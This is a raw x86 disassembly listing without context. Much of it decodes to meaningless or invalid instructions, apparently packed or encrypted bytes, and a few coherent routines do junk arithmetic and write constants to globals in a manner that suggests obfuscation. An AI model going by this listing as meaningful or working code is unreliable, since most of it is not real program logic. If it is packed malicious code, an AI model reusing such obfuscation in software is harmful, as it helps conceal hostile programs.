  415747:	loopne 0x415791
  415749:	pop    es
  41574a:	mov    ebp,0x448cdd05
  41574f:	jecxz  0x4157bc
  415751:	push   esp
  415752:	xor    al,0x3c
  415754:	cmp    esp,edx
  415756:	cli    
  415757:	mov    bh,bh
  415759:	loop   0x415722
  41575b:	add    al,0xb9
  41575d:	jns    0x415706
  41575f:	sub    edi,ebx
  415761:	arpl   sp,dx
  415763:	mov    bh,0xed
  415765:	dec    esi
  415766:	inc    edi
  415767:	push   es
  415768:	push   es
  415769:	sbb    eax,0xc72eaa6a
  41576e:	add    DWORD PTR ds:0x7d1685b,ecx
  415774:	mov    ebp,0x4bd712f2
  415779:	mov    ds:0x9b0c40e2,eax
  41577e:	mov    ch,0x3d
  415780:	mov    ah,0xc4
  415782:	jne    0x4157aa
  415784:	repnz in al,0x64
  415787:	and    al,0xb2
  415789:	jo     0x4157b4
  41578b:	push   ds
  41578c:	sbb    DWORD PTR [ebx+ebp*8],ecx
  41578f:	nop
  415790:	lock mov cl,0xb8
  415793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415794:	mov    esi,0xe651d4ba
  415799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41579a:	or     edi,DWORD PTR [ebx+0x7d]
  41579d:	nop
  41579e:	xchg   ebp,eax
  41579f:	cmp    eax,0x1719c0d7
  4157a4:	aaa    
  4157a5:	in     al,dx
  4157a6:	clc    
  4157a7:	enter  0xa790,0xe5
  4157ab:	sar    DWORD PTR [esi+edi*1-0x57],1
  4157af:	inc    esi
  4157b0:	ret    0x87e5
  4157b3:	cs inc ebx
  4157b5:	cmc    
  4157b6:	mov    cl,0x71
  4157b8:	ret    0x5227
  4157bb:	jb     0x4157ba
  4157bd:	(bad)  
  4157be:	jg     0x415771
  4157c0:	ss call 0xc8ecbba0
  4157c6:	rdpmc  
  4157c8:	outs   dx,BYTE PTR ds:[esi]
  4157c9:	shl    dl,1
  4157cb:	(bad)  
  4157cc:	shl    DWORD PTR [edx*8+0x43efe7bc],cl
  4157d3:	retf   0xbf9d
  4157d6:	jno    0x415792
  4157d8:	push   es
  4157d9:	and    ecx,ebp
  4157db:	mov    edx,0xab812f7f
  4157e0:	add    BYTE PTR [ebx+eax*2-0x191471e7],dl
  4157e7:	push   0x2b
  4157e9:	jp     0x41582e
  4157eb:	jnp    0x415826
  4157ed:	or     DWORD PTR [ebp+0x63d02a0e],ecx
  4157f3:	mov    bh,0x4e
  4157f5:	push   ss
  4157f6:	stos   DWORD PTR es:[edi],eax
  4157f7:	push   es
  4157f8:	or     BYTE PTR [ebx-0x5b9d8e11],cl
  4157fe:	cmp    ah,BYTE PTR [esi-0x6bded615]
  415804:	(bad)  
  415805:	int3   
  415806:	jns    0x41578a
  415808:	dec    ecx
  415809:	add    eax,0x955accf0
  41580e:	adc    esi,DWORD PTR ds:0x4cce7692
  415814:	xor    ah,al
  415816:	lods   eax,DWORD PTR ds:[esi]
  415817:	cmp    BYTE PTR [edi],0xeb
  41581a:	dec    edx
  41581b:	sahf   
  41581c:	mov    bl,0xa5
  41581e:	into   
  41581f:	std    
  415820:	sub    al,0xb
  415822:	arpl   WORD PTR [ecx],cx
  415824:	jnp    0x415835
  415826:	popf   
  415827:	popa   
  415828:	(bad)  
  415829:	stos   DWORD PTR es:[edi],eax
  41582a:	(bad)  
  41582b:	in     al,dx
  41582c:	jnp    0x41585c
  41582e:	mov    ah,0xb1
  415830:	iret   
  415831:	fwait
  415832:	add    edx,DWORD PTR [edx+0x5a7cf4aa]
  415838:	stos   BYTE PTR es:[edi],al
  415839:	je     0x415807
  41583b:	cmc    
  41583c:	cmp    edx,DWORD PTR [eax-0x5b]
  41583f:	addr16 push 0x54c27937
  415845:	test   DWORD PTR [edx-0x5497167d],ebx
  41584b:	shl    BYTE PTR [edi-0x78f84668],0xf0
  415852:	mov    ebp,0x49432d9f
  415857:	mov    edi,0x7c7df21c
  41585c:	xchg   edi,eax
  41585d:	rol    DWORD PTR [edi-0xefbcb1a],0x64
  415864:	je     0x41582e
  415866:	fmul   st(4),st
  415868:	(bad)  
  415869:	mov    esp,0x4e63c700
  41586e:	enter  0x8a5,0x3f
  415872:	sub    eax,eax
  415874:	out    dx,al
  415875:	jbe    0x4158ed
  415877:	mov    bl,0xf
  415879:	addr16 cdq 
  41587b:	adc    ah,dh
  41587d:	loope  0x415888
  41587f:	or     edx,DWORD PTR [esi+0x12fbc869]
  415885:	xchg   ecx,eax
  415886:	daa    
  415887:	inc    esp
  415888:	jae    0x4158cb
  41588a:	sbb    bh,al
  41588c:	xor    bh,BYTE PTR [edi-0x364430bd]
  415892:	addr16 dec esi
  415894:	ins    BYTE PTR es:[edi],dx
  415895:	xchg   ebp,eax
  415896:	mov    dl,0x8b
  415898:	xchg   ecx,eax
  415899:	xchg   ebx,eax
  41589a:	pusha  
  41589b:	fs dec eax
  41589d:	add    BYTE PTR [eax-0x2b467df9],ch
  4158a3:	mov    esp,0x1a60e5d0
  4158a8:	sti    
  4158a9:	or     eax,edx
  4158ab:	push   0x1
  4158ad:	add    eax,edi
  4158af:	push   eax
  4158b0:	lea    eax,[ebp-0x13]
  4158b3:	push   eax
  4158b4:	shl    ecx,0x1e
  4158b7:	call   0x411c08
  4158bc:	mov    eax,DWORD PTR [ebp+0x10]
  4158bf:	mov    ecx,DWORD PTR [ebp+0x14]
  4158c2:	shrd   eax,ecx,0x2
  4158c6:	shr    ecx,0x2
  4158c9:	mov    ecx,DWORD PTR [ebp+0x10]
  4158cc:	mov    edx,DWORD PTR [ebp+0x14]
  4158cf:	xor    eax,esi
  4158d1:	xor    edx,edx
  4158d3:	or     eax,edx
  4158d5:	add    eax,edi
  4158d7:	push   0x1
  4158d9:	push   eax
  4158da:	mov    eax,DWORD PTR [ebp+0x8]
  4158dd:	shl    ecx,0x1e
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	shrd   eax,ecx,0x2
  4158e7:	shr    ecx,0x2
  4158ea:	mov    ecx,DWORD PTR [ebp+0x8]
  4158ed:	mov    edx,DWORD PTR [ebp+0xc]
  4158f0:	xor    eax,esi
  4158f2:	xor    edx,edx
  4158f4:	or     eax,edx
  4158f6:	add    eax,edi
  4158f8:	push   eax
  4158f9:	shl    ecx,0x1e
  4158fc:	call   0x411c08
  415901:	push   0x1
  415903:	lea    eax,[ebp-0x13]
  415906:	push   eax
  415907:	mov    eax,DWORD PTR [ebp+0x10]
  41590a:	mov    ecx,DWORD PTR [ebp+0x14]
  41590d:	shrd   eax,ecx,0x2
  415911:	shr    ecx,0x2
  415914:	mov    ecx,DWORD PTR [ebp+0x10]
  415917:	mov    edx,DWORD PTR [ebp+0x14]
  41591a:	xor    eax,esi
  41591c:	xor    edx,edx
  41591e:	or     eax,edx
  415920:	add    eax,edi
  415922:	push   eax
  415923:	shl    ecx,0x1e
  415926:	call   0x411c08
  41592b:	mov    eax,DWORD PTR [ebp+0x10]
  41592e:	mov    ecx,DWORD PTR [ebp+0x14]
  415931:	shrd   eax,ecx,0x2
  415935:	shr    ecx,0x2
  415938:	mov    ecx,DWORD PTR [ebp+0x10]
  41593b:	mov    edx,DWORD PTR [ebp+0x14]
  41593e:	pop    edi
  41593f:	xor    eax,esi
  415941:	xor    edx,edx
  415943:	pop    esi
  415944:	shl    ecx,0x1e
  415947:	or     eax,edx
  415949:	pop    ebx
  41594a:	leave  
  41594b:	ret    0x10
  41594e:	mov    eax,DWORD PTR [esp+0x8]
  415952:	or     DWORD PTR ds:0x4284b5,0x7249
  41595c:	mov    ecx,DWORD PTR [esp+0x10]
  415960:	or     ecx,eax
  415962:	mov    DWORD PTR ds:0x428551,0x6956
  41596c:	mov    ecx,DWORD PTR [esp+0xc]
  415970:	jne    0x4159ee
  415976:	cmp    DWORD PTR ds:0x428425,0x0
  41597d:	mov    DWORD PTR ds:0x428545,0x1bde
  415987:	mov    DWORD PTR ds:0x428469,0x1ea7
  415991:	jmp    0x4159e5
  415996:	mov    eax,0x417c
  41599b:	mov    DWORD PTR ds:0x428571,ebx
  4159a1:	cmp    DWORD PTR ds:0x428425,0x0
  4159a8:	jne    0x4159d1
  4159ae:	push   DWORD PTR [ebp-0x28]
  4159b1:	call   DWORD PTR ds:0x42e0e0
  4159b7:	adc    DWORD PTR ds:0x4284b5,0x4283f9
  4159c1:	sub    DWORD PTR ds:0x42842d,0x4284e9
  4159cb:	and    DWORD PTR ds:0x428445,edi
  4159d1:	mov    DWORD PTR ds:0x42845d,0x6bfe
  4159db:	adc    DWORD PTR ds:0x4284cd,0x437a
  4159e5:	mov    eax,DWORD PTR [esp+0x4]
  4159e9:	mul    ecx
  4159eb:	ret    0x10
  4159ee:	push   ebx
  4159ef:	mul    ecx
  4159f1:	mov    ebx,eax
  4159f3:	mov    eax,DWORD PTR [esp+0x8]
  4159f7:	mul    DWORD PTR [esp+0x14]
  4159fb:	add    ebx,eax
  4159fd:	mov    eax,DWORD PTR [esp+0x8]
  415a01:	mul    ecx
  415a03:	add    edx,ebx
  415a05:	pop    ebx
  415a06:	ret    0x10
  415a09:	push   ebp
  415a0a:	mov    ebp,esp
  415a0c:	sub    esp,0x44
  415a0f:	push   ebx
  415a10:	push   esi
  415a11:	push   edi
  415a12:	mov    DWORD PTR [ebp-0x18],0x2
  415a19:	mov    DWORD PTR [ebp-0x14],0x29f0
  415a20:	mov    DWORD PTR [ebp-0x10],0x3716
  415a27:	mov    DWORD PTR [ebp-0x2c],0x4e09
  415a2e:	mov    DWORD PTR [ebp-0x28],0x4497
  415a35:	mov    DWORD PTR [ebp-0x24],0x5
  415a3c:	mov    DWORD PTR [ebp-0x20],0x2a0a
  415a43:	mov    DWORD PTR [ebp-0x1c],0x1
  415a4a:	mov    DWORD PTR [ebp-0xc],0xce6
  415a51:	mov    DWORD PTR [ebp-0x8],0x12b3
  415a58:	mov    DWORD PTR [ebp-0x4],0xb09
  415a5f:	mov    DWORD PTR [ebp-0x44],0x7617
  415a66:	mov    DWORD PTR [ebp-0x40],0x721a
  415a6d:	mov    DWORD PTR [ebp-0x3c],0x5151
  415a74:	mov    DWORD PTR [ebp-0x38],0x14aa
  415a7b:	mov    DWORD PTR [ebp-0x34],0x5a28
  415a82:	mov    DWORD PTR [ebp-0x30],0x19a8
  415a89:	mov    ecx,DWORD PTR [ebp-0x1c]
  415a8c:	mov    eax,DWORD PTR [ebp-0x20]
  415a8f:	xor    edx,edx
  415a91:	div    ecx
  415a93:	mov    ecx,DWORD PTR [ebp-0x24]
  415a96:	xor    edx,edx
  415a98:	mov    esi,0x1ac5
  415a9d:	push   0x20
  415a9f:	div    ecx
  415aa1:	mov    ecx,DWORD PTR [ebp-0x28]
  415aa4:	xor    edx,edx
  415aa6:	xor    eax,0x60dc
  415aab:	sub    eax,ecx
  415aad:	mov    ecx,DWORD PTR [ebp-0x2c]
  415ab0:	lea    edi,[eax+ecx*1-0x6300]
  415ab7:	mov    eax,DWORD PTR [ebp-0x4]
  415aba:	mov    ecx,DWORD PTR [ebp-0x8]
  415abd:	sub    eax,0x7721
  415ac2:	xor    eax,ecx
  415ac4:	mov    ecx,DWORD PTR [ebp-0xc]
  415ac7:	xor    eax,ecx
  415ac9:	or     eax,0x7bc9
  415ace:	xor    eax,0xfffff0db
  415ad3:	mov    ebx,edi
  415ad5:	sub    ebx,eax
  415ad7:	mov    eax,DWORD PTR [ebp-0x10]
  415ada:	mov    ecx,DWORD PTR [ebp-0x14]
  415add:	xor    eax,ecx
  415adf:	mov    ecx,DWORD PTR [ebp-0x18]
  415ae2:	sub    eax,esi
  415ae4:	div    ecx
  415ae6:	mov    ecx,0x211
  415aeb:	pop    edx
  415aec:	xor    eax,ecx
  415aee:	jmp    0x415ef7
  415af3:	push   ds
  415af4:	inc    ecx
  415af5:	cmp    edi,esi
  415af7:	mov    edx,0x9f9c24b7
  415afc:	push   ecx
  415afd:	mov    ebp,0x70d721cf
  415b02:	fstp   QWORD PTR [esp+edi*4-0x3b714142]
  415b09:	mov    esi,0x7d1485be
  415b0e:	mov    dh,BYTE PTR ds:0xd656cd92
  415b14:	es fsubr st(6),st
  415b17:	push   ebp
  415b18:	add    bh,BYTE PTR [edx+0x52]
  415b1b:	bound  eax,QWORD PTR [esi-0x3]
  415b1e:	ror    BYTE PTR [edx-0x7e961723],1
  415b24:	pop    ebp
  415b25:	mov    ch,0xe7
  415b27:	mov    dl,0x74
  415b29:	push   ebx
  415b2a:	fwait
  415b2b:	pop    esi
  415b2c:	retf   0xec9
  415b2f:	loopne 0x415b71
  415b31:	test   al,0x9f
  415b33:	lahf   
  415b34:	hlt    
  415b35:	sahf   
  415b36:	fild   DWORD PTR [ebp+0x22448ffd]
  415b3c:	iret   
  415b3d:	lods   al,BYTE PTR ds:[esi]
  415b3e:	jmp    0x979826fb
  415b43:	pop    esp
  415b44:	in     eax,dx
  415b45:	pop    ebx
  415b46:	aam    0xfb
  415b48:	dec    esi
  415b49:	mov    ebp,0xba28b7e
  415b4e:	pop    ebp
  415b4f:	push   esp
  415b50:	inc    eax
  415b51:	cmp    bh,BYTE PTR [edx]
  415b53:	repz aad 0x50
  415b56:	add    bh,BYTE PTR [esi+0xd]
  415b59:	pop    esp
  415b5a:	sahf   
  415b5b:	add    ecx,eax
  415b5d:	in     eax,0x58
  415b5f:	mov    esp,0x2c3d224b
  415b64:	jp     0x415b6e
  415b66:	mov    DWORD PTR [ecx+0x46],esi
  415b69:	lods   al,BYTE PTR ds:[esi]
  415b6a:	out    0xa3,al
  415b6c:	xchg   ecx,eax
  415b6d:	pop    ecx
  415b6e:	mov    fs,WORD PTR [edx+eiz*2-0x103a5ec]
  415b75:	fwait
  415b76:	data16 sbb al,0xc0
  415b79:	xchg   edi,eax
  415b7a:	addr16 addr16 int3 
  415b7d:	sbb    BYTE PTR [edx],cl
  415b7f:	adc    eax,0xaa655a4a
  415b84:	inc    ebx
  415b85:	loopne 0x415c01
  415b87:	pop    edx
  415b88:	jecxz  0x415b3f
  415b8a:	dec    ebp
  415b8b:	stos   BYTE PTR es:[edi],al
  415b8c:	jp     0x415be8
  415b8e:	sbb    dh,bl
  415b90:	mov    esi,0x4efe34cf
  415b95:	add    eax,0x3dfbcf7
  415b9a:	xchg   edx,eax
  415b9b:	out    dx,eax
  415b9c:	int3   
  415b9d:	ss jne 0x415b8d
  415ba0:	pop    ss
  415ba1:	jmp    0xb0c1:0x221b2995
  415ba8:	fstp   QWORD PTR [ebp+0x7e80361e]
  415bae:	xchg   edx,eax
  415baf:	jecxz  0x415b5e
  415bb1:	add    al,0xe9
  415bb3:	out    0x4a,al
  415bb5:	in     al,0x47
  415bb7:	mov    eax,ds:0x72284e87
  415bbc:	loopne 0x415b9f
  415bbe:	fldenv ss:[esi+0x36b11f0]
  415bc5:	adc    eax,0x73a31538
  415bca:	and    al,0x3c
  415bcc:	stos   BYTE PTR es:[edi],al
  415bcd:	jp     0x415bd6
  415bcf:	aad    0xe2
  415bd1:	arpl   WORD PTR [esi+0x1c],dx
  415bd4:	call   0xd9feebbe
  415bd9:	in     al,dx
  415bda:	jmp    FWORD PTR [esi]
  415bdc:	scas   al,BYTE PTR es:[edi]
  415bdd:	int3   
  415bde:	pop    ds
  415bdf:	pop    ecx
  415be0:	sub    dl,BYTE PTR [edi-0x30b848b3]
  415be6:	sub    DWORD PTR [ebx+0x3f20ba68],ebx
  415bec:	fs popa 
  415bee:	js     0x415c60
  415bf0:	inc    edx
  415bf1:	or     esi,DWORD PTR [ebp-0x31]
  415bf4:	nop
  415bf5:	or     BYTE PTR [ebp+edi*4+0x6f],dh
  415bf9:	and    al,0xbd
  415bfb:	adc    DWORD PTR [esp+ebx*8],edx
  415bfe:	push   0x5b
  415c00:	mov    ebx,0x9fa85c60
  415c05:	or     BYTE PTR [eax-0x464a4070],ah
  415c0b:	(bad)  
  415c0c:	push   eax
  415c0d:	adc    eax,0x1de14651
  415c12:	push   ds
  415c13:	call   0xa5b06fa4
  415c18:	dec    ebp
  415c19:	xchg   edx,eax
  415c1a:	fwait
  415c1b:	sub    al,0x10
  415c1d:	outs   dx,DWORD PTR gs:[esi]
  415c1f:	and    DWORD PTR [esi+0x6224b0c5],ecx
  415c25:	adc    eax,0x95e35c52
  415c2a:	(bad)  
  415c2b:	mov    esi,esi
  415c2d:	jbe    0x415c06
  415c2f:	pop    ss
  415c30:	adc    BYTE PTR [ebx+0x63],ch
  415c33:	rcr    ah,0xc5
  415c36:	lea    edi,[edi]
  415c38:	pop    ss
  415c39:	out    0x54,al
  415c3b:	in     eax,dx
  415c3c:	or     al,0x1
  415c3e:	mov    al,ds:0x18c7e826
  415c43:	adc    al,0x94
  415c45:	ja     0x415bd7
  415c47:	iret   
  415c48:	sbb    bl,dl
  415c4a:	and    al,0x70
  415c4c:	jae    0x415c9a
  415c4e:	mov    al,ds:0x3f33790
  415c53:	out    dx,eax
  415c54:	push   eax
  415c55:	cmp    BYTE PTR [eax+edi*2-0x22],bh
  415c59:	into   
  415c5a:	pop    eax
  415c5b:	xor    al,0x33
  415c5d:	pop    edi
  415c5e:	xor    BYTE PTR [ecx-0x9281a57],0xc6
  415c65:	fld    DWORD PTR [ebx-0x17]
  415c68:	xor    ch,BYTE PTR ss:[ecx]
  415c6b:	outs   dx,BYTE PTR ds:[esi]
  415c6c:	(bad)  
  415c6d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415c6f:	mov    edx,0xfa5148b6
  415c74:	out    dx,al
  415c75:	pushf  
  415c76:	cmp    al,0x67
  415c78:	lods   al,BYTE PTR ds:[esi]
  415c79:	xchg   esp,eax
  415c7a:	cdq    
  415c7b:	loope  0x415c47
  415c7d:	ja     0x415cb9
  415c7f:	sub    ecx,DWORD PTR [edi]
  415c81:	add    eax,DWORD PTR [eax]
  415c83:	pushf  
  415c84:	cli    
  415c85:	or     DWORD PTR [ebx-0x74],edx
  415c88:	ds popa 
  415c8a:	pop    ss
  415c8b:	adc    BYTE PTR [edx-0x27d8aa8f],dl
  415c91:	fmulp  st(1),st
  415c93:	loope  0x415d09
  415c95:	push   cs
  415c96:	mov    ds:0x8d8f8fad,eax
  415c9b:	inc    eax
  415c9c:	(bad)  
  415c9d:	in     al,dx
  415c9e:	or     bh,al
  415ca0:	jmp    0x1934:0x5aca239e
  415ca7:	add    eax,DWORD PTR [ecx+0x3fde056c]
  415cad:	std    
  415cae:	push   ebp
  415caf:	xchg   ebp,eax
  415cb0:	add    ecx,DWORD PTR [edi+0x38]
  415cb3:	fdivr  QWORD PTR [ecx-0x549b1d92]
  415cb9:	pop    ss
  415cba:	xor    al,BYTE PTR [esi]
  415cbc:	adc    ebp,ecx
  415cbe:	push   edi
  415cbf:	pop    ds
  415cc0:	or     BYTE PTR [ebp+0x3b],al
  415cc3:	and    BYTE PTR [ecx-0x16],0x45
  415cc7:	shr    eax,cl
  415cc9:	loop   0x415c6d
  415ccb:	mov    dl,BYTE PTR ds:0x430ed9d0
  415cd1:	or     eax,0xcae73a27
  415cd6:	test   BYTE PTR [ebp-0x4b],dl
  415cd9:	mov    al,ds:0xf49b8977
  415cde:	or     BYTE PTR [ecx+0x2063c761],dl
  415ce4:	xor    esp,ebx
  415ce6:	test   al,0x11
  415ce8:	lods   eax,DWORD PTR ds:[esi]
  415ce9:	addr16 push 0x7b
  415cec:	ins    BYTE PTR es:[edi],dx
  415ced:	push   es
  415cee:	xor    DWORD PTR [eax-0x62],ebx
  415cf1:	push   ecx
  415cf2:	add    esi,DWORD PTR [ecx+0x5f]
  415cf5:	inc    ebx
  415cf6:	mov    ds:0xe3dbc2c7,eax
  415cfb:	cmp    DWORD PTR [ecx-0x5f9e2753],esi
  415d01:	(bad)  
  415d02:	imul   DWORD PTR [ecx]
  415d04:	enter  0xfa4d,0xb2
  415d08:	das    
  415d09:	in     al,dx
  415d0a:	iret   
  415d0b:	push   edx
  415d0c:	mov    edx,0xc8038a18
  415d11:	jae    0x415d6a
  415d13:	adc    edi,DWORD PTR [edi]
  415d15:	xor    dl,ch
  415d17:	imul   eax,DWORD PTR [edx-0x1092b29a],0x371c2f9f
  415d21:	leave  
  415d22:	sub    al,0x44
  415d24:	mov    ebp,0xab101184
  415d29:	push   es
  415d2a:	std    
  415d2b:	dec    ecx
  415d2c:	mov    edx,DWORD PTR [esi-0x1e]
  415d2f:	xchg   esp,eax
  415d30:	(bad)  
  415d32:	mov    ch,0xb3
  415d34:	sub    bh,BYTE PTR [ecx+ebp*2-0x50cd8c18]
  415d3b:	adc    eax,0x1b6de3b7
  415d40:	mov    ?,WORD PTR [ecx]
  415d42:	out    0x25,al
  415d44:	ret    0x467a
  415d47:	pop    esi
  415d48:	ins    DWORD PTR es:[edi],dx
  415d49:	xor    eax,0x56b01d55
  415d4e:	leave  
  415d4f:	js     0x415d1a
  415d51:	push   edi
  415d52:	or     dl,BYTE PTR [ebx]
  415d54:	enter  0x7d3c,0x92
  415d58:	adc    esi,esi
  415d5a:	(bad)  
  415d5b:	fdiv   DWORD PTR [edi]
  415d5d:	les    ebp,FWORD PTR [esi+ebp*2-0x65b170d4]
  415d64:	int    0x96
  415d66:	js     0x415d12
  415d68:	shl    DWORD PTR [esi-0x39b27f9a],cl
  415d6e:	dec    esi
  415d6f:	add    edi,DWORD PTR [edi]
  415d71:	xlat   BYTE PTR ds:[ebx]
  415d72:	das    
  415d73:	test   DWORD PTR [edi],ebx
  415d75:	(bad)  
  415d76:	das    
  415d77:	imul   eax,DWORD PTR [ecx-0xe9577d8],0xffffffe8
  415d7e:	add    dh,BYTE PTR [esi-0xea05407]
  415d84:	idiv   DWORD PTR [eax+eiz*8+0x10]
  415d88:	jecxz  0x415d95
  415d8a:	push   ss
  415d8b:	mov    esi,0xd8f706ee
  415d90:	cmc    
  415d91:	jns    0x415d27
  415d93:	mov    BYTE PTR [edx-0x39],dl
  415d96:	jae    0x415d6c
  415d98:	mov    edx,0xb64584e5
  415d9d:	stos   BYTE PTR es:[edi],al
  415d9e:	xchg   ecx,eax
  415d9f:	test   DWORD PTR [ebp-0x9],ebp
  415da2:	retf   0xf88a
  415da5:	inc    esp
  415da6:	mov    BYTE PTR [edi+0x52],cl
  415da9:	pop    edi
  415daa:	out    0x4e,al
  415dac:	clc    
  415dad:	(bad)  
  415dae:	(bad)  
  415daf:	fbld   TBYTE PTR [ebx+0x28c9a622]
  415db5:	mov    eax,ebp
  415db7:	pop    eax
  415db8:	push   eax
  415db9:	push   edx
  415dba:	add    DWORD PTR [edx-0x3e],0xd5631221
  415dc1:	push   0xffffffb3
  415dc3:	loope  0x415dd7
  415dc5:	xchg   edi,eax
  415dc6:	pop    eax
  415dc7:	out    0x52,eax
  415dc9:	fcmovb st,st(7)
  415dcb:	ret    0x4c1e
  415dce:	and    edx,ecx
  415dd0:	cs aam 0x78
  415dd3:	or     ebx,ebp
  415dd5:	(bad)  
  415dd6:	dec    edx
  415dd7:	jmp    0xa42e:0x711212c8
  415dde:	push   esi
  415ddf:	lahf   
  415de0:	add    DWORD PTR [ebp+esi*1+0x6e2849ca],esp
  415de7:	mov    eax,ds:0x3bacf155
  415dec:	jb     0x415df2
  415dee:	(bad)  
  415def:	xor    eax,0x8b4a6d08
  415df4:	xchg   ebx,eax
  415df5:	cli    
  415df6:	aam    0x1f
  415df8:	mov    al,ds:0x7ef081dd
  415dfd:	sbb    esi,esi
  415dff:	inc    ecx
  415e00:	addr16 call 0xa455:0xd9a9dbb0
  415e08:	xchg   esp,eax
  415e09:	adc    DWORD PTR [ecx+0x7fc8cc2a],edi
  415e0f:	mov    al,0xb3
  415e11:	adc    esp,edx
  415e13:	es push 0xffffff96
  415e16:	mov    ch,ah
  415e18:	stc    
  415e19:	jno    0x415e0c
  415e1b:	jbe    0x415dab
  415e1d:	aam    0x19
  415e1f:	je     0x415df1
  415e21:	ja     0x415e59
  415e23:	and    BYTE PTR [ebx+0x696f7971],bl
  415e29:	or     eax,edx
  415e2b:	jg     0x415e7d
  415e2d:	mov    esi,0x78677be
  415e32:	mov    dh,0x18
  415e34:	scas   eax,DWORD PTR es:[edi]
  415e35:	inc    edi
  415e36:	xchg   edi,eax
  415e37:	call   DWORD PTR [ecx]
  415e39:	test   DWORD PTR [eax+0x7f90db0],0x74c04d15
  415e43:	jns    0x415e3b
  415e45:	adc    al,0xe0
  415e47:	xchg   edx,eax
  415e48:	cmp    esi,ebx
  415e4a:	push   ds
  415e4b:	xchg   edx,eax
  415e4c:	outs   dx,DWORD PTR ds:[esi]
  415e4d:	lods   eax,DWORD PTR ds:[esi]
  415e4e:	xor    DWORD PTR [edi+0x77df53d6],edx
  415e54:	sub    BYTE PTR [esi+edi*8],ah
  415e57:	push   edx
  415e58:	push   0x347c64e6
  415e5d:	adc    DWORD PTR [edx],0xffffffaa
  415e60:	(bad)  
  415e61:	das    
  415e62:	nop
  415e63:	xor    esi,ebx
  415e65:	ret    0x8418
  415e68:	jo     0x415ecc
  415e6a:	jg     0x415e79
  415e6c:	mov    eax,ds:0xd351933
  415e71:	and    DWORD PTR [ebx-0x64eed338],ebp
  415e77:	rcl    eax,0xf9
  415e7a:	jnp    0x415eec
  415e7c:	jno    0x415eb5
  415e7e:	mov    bl,0x5b
  415e80:	(bad)  
  415e81:	cmp    eax,0x52ed4e43
  415e86:	sub    dl,BYTE PTR [edi+0x6a]
  415e89:	fst    QWORD PTR [ebp+0x6]
  415e8c:	cmp    BYTE PTR [esi-0x1ce25d91],bh
  415e92:	daa    
  415e93:	xchg   esp,eax
  415e94:	jp     0x415e39
  415e96:	add    esp,DWORD PTR [eax+eiz*4-0xe]
  415e9a:	xor    bl,ch
  415e9c:	sub    al,0x0
  415e9e:	mov    esp,0xedb3c601
  415ea3:	outs   dx,DWORD PTR ds:[esi]
  415ea4:	jno    0x415ea8
  415ea6:	fwait
  415ea7:	push   ss
  415ea8:	inc    esp
  415ea9:	adc    cl,BYTE PTR [edi]
  415eab:	xor    al,0xff
  415ead:	fisub  DWORD PTR [eax-0x7d5540dd]
  415eb3:	inc    eax
  415eb4:	lea    eax,[ebp+0x3d884d98]
  415eba:	fwait
  415ebb:	mov    cl,0x7c
  415ebd:	div    BYTE PTR [eax]
  415ebf:	retf   0xb406
  415ec2:	mov    eax,ds:0x4cfef079
  415ec7:	stos   DWORD PTR es:[edi],eax
  415ec8:	pop    ecx
  415ec9:	mov    BYTE PTR [esi],bl
  415ecb:	outs   dx,BYTE PTR ds:[esi]
  415ecc:	lods   eax,DWORD PTR ds:[esi]
  415ecd:	loop   0x415e68
  415ecf:	or     al,0x1
  415ed1:	stc    
  415ed2:	add    DWORD PTR [edi],ebp
  415ed4:	shl    edx,0x22
  415ed7:	mov    bh,0x1a
  415ed9:	int3   
  415eda:	ins    DWORD PTR es:[edi],dx
  415edb:	loope  0x415e7a
  415edd:	and    eax,0xfff3edb3
  415ee2:	popa   
  415ee3:	cs pop eax
  415ee5:	(bad)  
  415ee6:	xchg   esp,eax
  415ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ee8:	jle    0x415f48
  415eea:	push   ecx
  415eeb:	xor    dl,BYTE PTR [ebp+0x4c35d5f7]
  415ef1:	cmp    DWORD PTR [ecx-0x23906aeb],edx
  415ef7:	sub    edx,eax
  415ef9:	cmp    ebx,edx
  415efb:	ja     0x4167d7
  415f01:	jmp    0x415f09
  415f06:	mov    edi,DWORD PTR [ebp-0x2c]
  415f09:	mov    DWORD PTR [ebp-0x20],0x1aa3
  415f10:	mov    DWORD PTR [ebp-0x24],0x52d
  415f17:	mov    DWORD PTR [ebp-0x28],0x226c
  415f1e:	jmp    0x416327
  415f23:	dec    eax
  415f24:	pop    edi
  415f25:	xor    ch,BYTE PTR [esi-0x48b34bc6]
  415f2b:	inc    edx
  415f2c:	imul   edx,edi,0xa0fbf3e3
  415f32:	nop
  415f33:	ins    BYTE PTR es:[edi],dx
  415f34:	(bad)  
  415f35:	sar    BYTE PTR [esi-0x41413b72],0x40
  415f3c:	test   BYTE PTR [edx-0x3e],al
  415f3f:	out    0x1e,eax
  415f41:	lea    edi,[esi-0x80]
  415f44:	dec    ebp
  415f45:	fs cmp eax,0x165847aa
  415f4b:	div    BYTE PTR [esi-0x75]
  415f4e:	lds    ebx,FWORD PTR [edi-0x6f]
  415f51:	jp     0x415efe
  415f53:	or     eax,0x9895c56f
  415f58:	and    edx,esp
  415f5a:	xchg   esi,eax
  415f5b:	cmp    dl,cl
  415f5d:	mov    ecx,DWORD PTR [eax]
  415f5f:	sahf   
  415f60:	(bad)  
  415f61:	jb     0x415f2e
  415f63:	mov    ds:0x6a40189a,al
  415f68:	imul   esi,ebx,0x42c3daa4
  415f6e:	int    0x5c
  415f70:	iret   
  415f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f72:	int3   
  415f73:	push   edi
  415f74:	aam    0xf7
  415f76:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f78:	out    0xaa,eax
  415f7a:	fsubr  DWORD PTR [edi+0x4f]
  415f7d:	fidiv  WORD PTR [ebx+ebp*8+0x33]
  415f81:	ret    
  415f82:	adc    BYTE PTR [ebp-0x6cdda33e],0xef
  415f89:	cmovno edi,DWORD PTR [edi+0x2162123b]
  415f90:	repnz dec edi
  415f92:	in     al,dx
  415f93:	into   
  415f94:	jns    0x415fb9
  415f96:	pop    ds
  415f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f98:	jecxz  0x416008
  415f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9b:	jae    0x415f63
  415f9d:	mov    edx,0x2ce93c66
  415fa2:	dec    ecx
  415fa3:	in     eax,dx
  415fa4:	aaa    
  415fa5:	(bad)  
